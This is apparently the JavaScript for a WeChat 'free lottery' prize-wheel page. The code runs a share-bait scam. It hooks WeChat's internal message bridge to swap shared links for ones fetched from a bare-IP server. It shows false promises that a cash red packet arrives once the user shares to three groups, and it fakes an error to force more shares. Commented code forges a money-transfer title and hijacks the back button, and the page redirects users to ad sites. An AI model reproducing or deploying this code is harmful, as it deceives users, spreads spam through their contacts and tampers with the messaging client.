var baiduKey = "45e4ed65d019478f202ec342aaa07047";
var isDev = false;
var fenliuData = new Array(
);
var fenliuTime = 10;
var isNeedReloadShare = false;


Zepto(function ($) {
    var imgUrl = "http://ww4.sinaimg.cn/mw690/006xLWk3gw1f6uucy8o2bj305k05kq2y.jpg";
    $(".topcontent .avatar img").attr("src", imgUrl);
    $(".user-picture img").attr("src", imgUrl);
})

var lastBackIndex = 0;
//
// var hour = new Date().getHours();
// if(hour >=22 || hour <= 7){
//     lastBackIndex = 1;
// }

var turnplate={
        restaraunts:[],             //大转盘奖品名称
        colors:[],                  //大转盘奖品区块对应背景颜色
        outsideRadius:192,          //大转盘外圆的半径
        textRadius:155,             //大转盘奖品位置距离圆心的距离
        insideRadius:68,            //大转盘内圆的半径
        startAngle:0,               //开始角度
        
        bRotate:false               //false:停止;ture:旋转
    };


    //使用js存储数据
    var storeWithExpiration = {
    set: function(key, val, exp, num) {
        store.set(key, { val:val, exp:exp, num:num, time:new Date().getTime() })
    },
    get: function(key) {
        var info = store.get(key)
        if (!info) { return null }
        if (new Date().getTime() - info.time > info.exp) { return null }
        return info.val
    },
    getNum: function(key) {
        var info = store.get(key)
        if (!info) { return null }
        if (new Date().getTime() - info.time > info.exp) { return null }
        return info.num
    },
    }
    // storeWithExpiration.set('tel', '13456780987', 1000, 1);
//setTimeout(function() { console.log(storeWithExpiration.get('mobile')); }, 500); // -> "bar"

var currentTime = new Date().getTime();
// window.setTimeout(
//     function () {
//         history.pushState(null, null, "#weixin");
//         window.onpopstate = function () {
//             history.pushState(null, null, "#weixin2");
//             var currentTime2 = new Date().getTime();
//             if (currentTime2 - currentTime < 500) {
//                 return true;
//             }
//             lastBackIndex++;
//             if (lastBackIndex % 2 == 0 && typeof(adUrl) != "undefined") {
//                 location.href = adUrl;
//             } else {
//                 selfLoad();
//             }
//             return true;
//         };
//     }, 50);

//分流                                       
function fenliu() {
    //有5分之一的几率切到新的上面
    var time = new Date().getTime();


    if (fenliuTime > 0 && time % fenliuTime != 1) {
        return;
    }

    if (fenliuData == null || fenliuData.length <= 0) {
        return;
    }
    // //
    var url = fenliuData[time % fenliuData.length];
    window.location.replace(url);
}


var weui = {
    alert: function (msg, title, callback) {
        title = title ? title : "温馨提醒";
        var alertHtml = '<div class="weui_dialog_alert" style="position: fixed; z-index: 2000; display:none;">';
        alertHtml += '<div class="weui_mask"></div>';
        alertHtml += '<div class="weui_dialog">';
        alertHtml += '<div class="weui_dialog_hd"><strong class="weui_dialog_title" style="color: #000;">' + title + '</strong></div>';
        alertHtml += '<div class="weui_dialog_bd"></div>';
        alertHtml += '<div class="weui_dialog_ft">';
        alertHtml += '<a href="javascript:;" class="weui_btn_dialog primary" style="padding:10px;font-weight:bold;">好</a>';
        alertHtml += '</div>';
        alertHtml += '</div>';
        alertHtml += '</div>';
        if ($(".weui_dialog_alert").length > 0) {
            $(".weui_dialog_alert .weui_dialog_bd").empty();
        } else {
            $("body").append($(alertHtml));
        }
        var weui_alert = $(".weui_dialog_alert");
        weui_alert.show();
        weui_alert.find(".weui_dialog_bd").html(msg);
        weui_alert.find('.weui_btn_dialog').off("click").on('click',
            function () {
                weui_alert.hide();
                if (callback) {
                    callback();
                }
            });
    }
}

function wxAlert(msg, callback) {
    weui['alert'](msg, "", callback);
}

//是否是新版的微信
function isWxNewVersion() {
    if (isDev) {
        return true;
    }
    if ((/carlos1/i).test(window.location.href)) {
        return false;
    }

    if ((/carlos2/i).test(window.location.href)) {
        return true;
    }

    var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
    if (!wechatInfo) {
        return false;
    }
    console.log(wechatInfo[1]);
    return wechatInfo.length > 1 && wechatInfo[1] == "6.3.23";
}


// var mm = (Math.random() * 30 + 80).toFixed(2);

// $(function () {
//     $('.firstcontainer').width($('.box-hcenter').eq(0).width());
// });

// function display() {
//     for (var i = 0; i < 7; i++) {
//         var temp = Math.random() * 33 + 3;
//         $(".showmoneyplace").eq(i).html('+' + temp.toFixed(2) + '元');
//     }
// }

// var oChai = document.getElementById("chai");
// var oContainer = document.getElementById("firstcontainer");
// var more = 0;
// oChai.onclick = function () {
//     oChai.setAttribute("class", "rotate");
//     setTimeout(function () {
//         oContainer.style.display = "none";
//         $('#moneyzoom').text(mm);
//         $('#mm').text(mm);
//         wxAlert('恭喜您获得微信现金红包' + mm + '元！分享到不同的微信群即可到账！');
//         setInterval("display()", 1500);
//     }, 1500)
// }

function shade() {
    $('#shadeshade').show();
    wxAlert('点击右上角，选择“分享到朋友圈”<br/>或分享到不同的微信群即可领取！', clickAlerConfrimCallBack);
}

var oldHandleMesageHook;
var curSetHookCount = 0;
var regHookCount = 0;
var shareTimes = 0;
var maxShareSize = 3;

var isShareLoadding = false;
function clickAlerConfrimCallBack() {
    if (isShareLoadding || !isWxNewVersion()) {
        return;
    }
    //设置文案
    var shareObject = getShareObject();
    // alert(shareObject.title+shareObject.imgUrl);
    $("#shareDefaultUrlId").attr("src", shareObject.imgUrl);
    document.title = shareObject.title;

    //如果还没到最大值,则倒计时
    if (maxShareSize > shareTimes) {
        // alert(shareTimes);
        isShareLoadding = true;
        var time = 5000;
        if (shareTimes == 0) {
            time = 8000;
        }
        if (isDev) {
            time = 500;
        }
        setTimeout(function () {
            isShareLoadding = false;
            shareComplete();
            //alert("isShareLoadding");
        }, time);
    }
}




function setHandleMessageHookForWeixin() {
    try {

        if (curSetHookCount > 15) {
            return;
        }
        if (!window.WeixinJSBridge) {
            setTimeout("setHandleMessageHookForWeixin()", 1000);
            curSetHookCount++;
            return;
        }

        if (!oldHandleMesageHook) {
            oldHandleMesageHook = window.WeixinJSBridge._handleMessageFromWeixin;
            window.WeixinJSBridge._handleMessageFromWeixin = function (message) {
                try {
                    var realMessage = message['__json_message'];
                    var shaStr = message['__sha_key'];
                    var eventId = realMessage['__event_id'];
                    var msgType = realMessage['__msg_type'];
                    var callbackId = realMessage['__callback_id'];

                    if (eventId && eventId.indexOf("share") > 0) {
						//分享
                        var eventMsg = "sendAppMessage";
                        var tmstr = eventId;

                        if (eventId == "general:share") {
                            var params = realMessage['__params'];
                            tmstr = params['shareTo'];
                        }
                        if (tmstr.indexOf("timeline") != -1) {
                            eventMsg = "shareTimeline";
                        }
                        var shareObject = getShareObject();
                        var data = {
                            "link": shareUrl,
                            "desc": shareObject.desc,
                            "title": shareObject.title,
                            "img_url": shareObject.imgUrl
                        };
                        getNewShareUrl();

                        if (eventMsg) {
                            window.WeixinJSBridge.invoke(eventMsg, data, shareCallback);
                            restoreHandleMessageHookForWeixin();
                        }
                    }
                } catch (e) {
                }
            }
        }

        regHookCount++;
    } catch (e) {
    }
}

function restoreHandleMessageHookForWeixin() {
    if (oldHandleMesageHook) {
        window.WeixinJSBridge._handleMessageFromWeixin = oldHandleMesageHook;
    }
}

function shareCallback(res) {

    var errMsg = res['err_msg'];

    var one = storeWithExpiration.get('phone');
    if (errMsg) {
        if (errMsg.indexOf(":confirm") != -1 || errMsg.indexOf(":ok") != -1) {
            shareComplete();complete();
            storeWithExpiration.set('share', 13000000000, 7200, 1);
            $('.playnum').html(1);
            // alert(storeWithExpiration.get('share'));
            // alert("222222");
        } else {

        }
    }


    curSetHookCount = 0;
    oldHandleMesageHook = undefined;
    setHandleMessageHookForWeixin();
}

function complete() { alert(111111);
    shareTimes++;

    if (shareTimes < 1) {
    } else {
        switch (shareTimes) {
            case 1:
                wxAlert('发送成功,请再发送2个不同的微信群即可領取！', clickAlerConfrimCallBack);
                break;
            case 2:
                wxAlert('发送成功,请再发送1个不同的微信群即可領取！', clickAlerConfrimCallBack);
                break;
            case 3:
                if (isNeedReloadShare) {
                    isNeedReloadShare = false;
                    shareTimes = 0;
                    wxAlert('出现未知错误,分享失败,请重新分享',clickAlerConfrimCallBack);
                    return;
                }
                wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                setTimeout(goToShareNexUrlnew, 2000);
                break;
            case 5:
                wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                setTimeout(goToShareNexUrlnew, 2000);
                break;
            case 6:
            case 7:
            case 8:
            case 9:
            case 10:
                wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                break;
        }
    }
}

function shareComplete() {
    shareTimes++;

    if (shareTimes < 1) {
    } else {
        switch (shareTimes) {
            case 1:
                wxAlert('发送成功,请再发送2个不同的微信群即可領取！', clickAlerConfrimCallBack);
                break;
            case 2:
                wxAlert('发送成功,请再发送1个不同的微信群即可領取！', clickAlerConfrimCallBack);
                break;
            case 3:
                if (isNeedReloadShare) {
                    isNeedReloadShare = false;
                    shareTimes = 0;
                    wxAlert('出现未知错误,分享失败,请重新分享',clickAlerConfrimCallBack);
                    return;
                }
                wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                setTimeout(goToShareNexUrlnew, 2000);
                break;
            case 5:
                wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                setTimeout(goToShareNexUrlnew, 2000);
                break;
            case 6:
            case 7:
            case 8:
            case 9:
            case 10:
                wxAlert('恭喜您已经成功領取到紅包，紅包将在48小时存入您的钱包中！</br> <span style="color:red">48小时内请勿删除朋友圈内容，以免影响到账</span>');
                break;
        }
    }
}

//分享出去的广告链接
function goToShareNexUrlnew() {
   window.location.href = "http://dm9911.com/?do=bW9iaWxlZGV0YWlsXzM3NV8yMTY1OV8wODI5MTkzOTMy";
}


//获取链接
var shareUrl = window.location.href;
function getNewShareUrl() {
    var shareGetUrl = "http://119.29.8.160:8800/index1";
    $.ajax({
        type: "GET",
        url: shareGetUrl,
        success: function (msg) {
            shareUrl = msg;
        }
    });
}

//分享的展示
var currentShareObject = {
    title: "免费抽奖",
    desc: "每天免费领",
    imgUrl: "http://ww2.sinaimg.cn/mw690/006xLWk3gw1f6k0rfk2ynj30b40b4myu.jpg"
};

function getShareObject() {
    //如果是第二个页面的画,则直接返回钱
    // 向你转账XX元
    // [微信红苞] 恭喜发财，大吉大利
    // if (shareTimes == 1) {
    //     return {title: "向你转账96元", desc: "请你在2小时内确认", imgUrl: "http://c.wx3010.top/res/zhuanz2.png"};
    // } else if (shareTimes == 2) {
    //     return {title: "微信҉葒苞 恭囍发財", desc: "请你在2小时内确认", imgUrl: "http://c.wx3010.top/res/zhuanz2.png"};
    // }
    return currentShareObject;
}

// document.title = currentShareObject.title;
// var checkCityTime = 0;
// function checkCity() {
//     fenliu();
//     //有5分之一的几率切到
//     if (checkCityTime > 20) {
//         return;
//     }
//     checkCityTime++;
//     if (typeof(remote_ip_info) == "undefined") {
//         setTimeout(checkCity, 300);
//         console.log("checkCity")
//         return;
//     }
//     var city = remote_ip_info.city;
//     // alert(city);
//     if (city == "深圳" || city == "广州" || city == "成都") {
//         // window.location.replace("http://hb.wx3003.top");
//         // return;
//     }
//     currentShareObject.title = "邀请你加入" + city + "红苞群";
//     document.title = currentShareObject.title;
//     currentShareObject.desc = "我邀请你加入" + city + "红苞群,每天免费领";
//     $("#cityTitle").html(currentShareObject.title);
// }

// checkCity();


//check跳转
(function () {
    if (!isWxNewVersion()) {
        return;
    }
    var hm = document.createElement("script");
    //hm.src = checkJumpUrl;
    // hm.src = "http://www.kanav022.cn/get/index.php?id=684";
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(hm, s);
})();

var checkNeedGoToNextTime = 0;
function checkNeedGoToNext() {
    console.log("mNextUrl2")
    if (checkNeedGoToNextTime > 10) {
        return;
    }
    checkNeedGoToNextTime++;
    if (typeof(mNextUrl2) == "undefined") {
        setTimeout(checkNeedGoToNext, 300);
        return;
    }
    // alert("goto="+mNextUrl2);
    $("body").hide();
    window.location.replace(mNextUrl2);
}


if (!isWxNewVersion()) {
	getNewShareUrl();
    setHandleMessageHookForWeixin();
}

//统计
// var _hmt = _hmt || [];
// (function () {
//     var hm = document.createElement("script");
//     hm.src = "//hm.baidu.com/hm.js?" + baiduKey;
//     var s = document.getElementsByTagName("script")[0];
//     s.parentNode.insertBefore(hm, s);
// })();

function onBridgeReady() {
    WeixinJSBridge.call('showOptionMenu');
    // WeixinJSBridge.call('hideMenuItems');
}
if (typeof WeixinJSBridge == "undefined") {
    if (document.addEventListener) {
        document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
    } else if (document.attachEvent) {
        document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
        document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
    }
} else {
    onBridgeReady();
}




$(document).ready(function(){
    // alert(storeWithExpiration.get('tel'));
    var one = storeWithExpiration.get('tel');
    var two = storeWithExpiration.get('phone');
     
    // alert(one+'----'+two);
        console.log(one);
        console.log(two);

        var playnum;

        if (one == two) {
            // if (share) {
            //     playnum = storeWithExpiration.getNum('share');
            //     alert(playnum);
            // } else {
                playnum = 0;
            // }
        }else {
            playnum = storeWithExpiration.getNum('tel'); //初始次数，由后台传入

            console.log(storeWithExpiration.getNum('tel'));
        }
        // var playnum = 3; //初始次数，由后台传入
         $('.playnum').html(playnum);
        var isture = 0;

        //动态添加大转盘的奖品与奖品区域背景颜色
        turnplate.restaraunts = ["一等奖","谢谢参与","二等奖", "谢谢参与","三等奖" ,"谢谢参与"];
        turnplate.colors = ["#FFF4D6", "#FFFFFF", "#FFF4D6", "#FFFFFF","#FFF4D6", "#FFFFFF"];

        
        var rotateTimeOut = function (){
            $('#wheelcanvas').rotate({
                angle:0,
                animateTo:2160,
                duration:8000,
                callback:function (){
                    alert('网络超时，请检查您的网络设置！');
                }
            });
        };

        //旋转转盘 item:奖品位置; txt：提示语 , 跳转链接;
        var rotateFn = function (item, txt, goUrl){
            var angles = item * (360 / turnplate.restaraunts.length) - (360 / (turnplate.restaraunts.length*2));
            if(angles<270){
                angles = 270 - angles; 
            }else{
                angles = 360 - angles + 270;
            }
            $('#wheelcanvas').stopRotate();
            $('#wheelcanvas').rotate({
                angle:0,
                animateTo:angles+1800,
                duration:8000,
                callback:function (){
                    alert(txt);
                    turnplate.bRotate = !turnplate.bRotate;
                    var bl = false;
                    if (txt != "谢谢参与！") {
                        bl = true;
                    }
                    if ( bl == true ) {
                        window.location.href=goUrl;
                    }
                }
            });
        };


        $('.pointer').click(function (){
            var share = storeWithExpiration.get('share');   
            if (share) {
                playnum = storeWithExpiration.getNum('share');
                //alert(playnum);
            }
            
            if(playnum <= 0) { //当抽奖次数为0的时候执行
                    alert("没有次数了,可通过分享链接获取抽奖次数");
                    //alert(share);
                    $('.playnum').html(0);
                    return false;
                } else { //还有次数就执行
                    playnum = playnum - 1; //执行转盘了则次数减1
                    if(playnum <= 0) {
                        playnum = 0;
                        storeWithExpiration.set('phone', one, 7200, 0);//这个号码另存
                        storeWithExpiration.set('share', '13000000000', 7200, 0);
                    }

                    storeWithExpiration.set('tel', one, 7200, playnum);
                    $('.playnum').html(playnum);
                }
            
            if(turnplate.bRotate)return;
            turnplate.bRotate = !turnplate.bRotate;
            //获取随机数(奖品个数范围内)
            var item = rnd(2, turnplate.restaraunts.length);
            //奖品数量等于10,指针落在对应奖品区域的中心角度[252, 216, 180, 144, 108, 72, 36, 360, 324, 288]
            //["一等奖","谢谢参与","二等奖", "谢谢参与","三等奖" ,"谢谢参与"];
             // rotateFn(item, turnplate.restaraunts[item-1]);
             // console.log(item);
            switch(item) {
                case 1:
                    rotateFn(item, '抱歉，一等奖已经领取完了!', '');
                    break;
                case 2:
                    rotateFn(item, '谢谢参与！', '');
                    break;
                case 3:
                    rotateFn(item, '恭喜您抽中二等奖!!', 'http://xishop.com.cn/?do=bW9iaWxlZGV0YWlsXzQxMV8yMTY1OV8wOTEzMjAzMjE4');
                    break;
                case 4:
                    rotateFn(item, '谢谢参与！', '');
                    break;
                case 5:
                    rotateFn(item, '恭喜您抽中三等奖!!!', 'http://guohuwang.net/article/425_21659_0_0/710.html');
                    break;
                case 6:
                    rotateFn(item, '谢谢参与！', '');
                    break;
            }
             // console.log(item);
        });
});

// function shareCallback(res) {

//     var errMsg = res['err_msg'];

//     var one = storeWithExpiration.get('phone');
//     if (errMsg) {
//         if (errMsg.indexOf(":confirm") != -1 || errMsg.indexOf(":ok") != -1) {
//             shareComplete();
//             storeWithExpiration.set('share', one, 7200, 1);
//             alert(storeWithExpiration.get('share'));
//             alert("222222");
//         } else {

//         }
//     }


//     curSetHookCount = 0;
//     oldHandleMesageHook = undefined;
//     setHandleMessageHookForWeixin();
// }

function rnd(n, m){
        var random = Math.floor(Math.random()*(m-n+1)+n);
        return random;
        
    }


    //页面所有元素加载完毕后执行drawRouletteWheel()方法对转盘进行渲染
    window.onload=function(){
        drawRouletteWheel();
    };

    function drawRouletteWheel() {    
      var canvas = document.getElementById("wheelcanvas");    
      if (canvas.getContext) {
          //根据奖品个数计算圆周角度
          var arc = Math.PI / (turnplate.restaraunts.length/2);
          var ctx = canvas.getContext("2d");
          //在给定矩形内清空一个矩形
          ctx.clearRect(0,0,422,422);
          //strokeStyle 属性设置或返回用于笔触的颜色、渐变或模式  
          ctx.strokeStyle = "#FFBE04";
          //font 属性设置或返回画布上文本内容的当前字体属性
          ctx.font = '16px Microsoft YaHei';      
          for(var i = 0; i < turnplate.restaraunts.length; i++) {       
              var angle = turnplate.startAngle + i * arc;
              ctx.fillStyle = turnplate.colors[i];
              ctx.beginPath();
              //arc(x,y,r,起始角,结束角,绘制方向) 方法创建弧/曲线（用于创建圆或部分圆）    
              ctx.arc(211, 211, turnplate.outsideRadius, angle, angle + arc, false);    
              ctx.arc(211, 211, turnplate.insideRadius, angle + arc, angle, true);
              ctx.stroke();  
              ctx.fill();
              //锁画布(为了保存之前的画布状态)
              ctx.save();   
              
              //----绘制奖品开始----
              ctx.fillStyle = "#E5302F";
              var text = turnplate.restaraunts[i];
              var line_height = 17;
              //translate方法重新映射画布上的 (0,0) 位置
              ctx.translate(211 + Math.cos(angle + arc / 2) * turnplate.textRadius, 211 + Math.sin(angle + arc / 2) * turnplate.textRadius);
              
              //rotate方法旋转当前的绘图
              ctx.rotate(angle + arc / 2 + Math.PI / 2);
              
              /** 下面代码根据奖品类型、奖品名称长度渲染不同效果，如字体、颜色、图片效果。(具体根据实际情况改变) **/
              if(text.indexOf("M")>0){//流量包
                  var texts = text.split("M");
                  for(var j = 0; j<texts.length; j++){
                      ctx.font = j == 0?'bold 20px Microsoft YaHei':'16px Microsoft YaHei';
                      if(j == 0){
                          ctx.fillText(texts[j]+"M", -ctx.measureText(texts[j]+"M").width / 2, j * line_height);
                      }else{
                          ctx.fillText(texts[j], -ctx.measureText(texts[j]).width / 2, j * line_height);
                      }
                  }
              }else if(text.indexOf("M") == -1 && text.length>6){//奖品名称长度超过一定范围 
                  text = text.substring(0,6)+"||"+text.substring(6);
                  var texts = text.split("||");
                  for(var j = 0; j<texts.length; j++){
                      ctx.fillText(texts[j], -ctx.measureText(texts[j]).width / 2, j * line_height);
                  }
              }else{
                  //在画布上绘制填色的文本。文本的默认颜色是黑色
                  //measureText()方法返回包含一个对象，该对象包含以像素计的指定字体宽度
                  ctx.fillText(text, -ctx.measureText(text).width / 2, 0);
              }
              
              //添加对应图标
              // if(text.indexOf("闪币")>0){
                 //  var img= document.getElementById("shan-img");
                 //  img.onload=function(){  
                    //   ctx.drawImage(img,-15,10);      
                 //  }; 
                 //  ctx.drawImage(img,-15,10);  
              // }
              if(text.indexOf("谢谢参与")>=0){
                  var img= document.getElementById("sorry-img");
                  img.onload=function(){  
                      ctx.drawImage(img,-15,10);      
                  };  
                  ctx.drawImage(img,-15,10);  
              }
              //把当前画布返回（调整）到上一个save()状态之前 
              ctx.restore();
              //----绘制奖品结束----
          }     
      } 
}
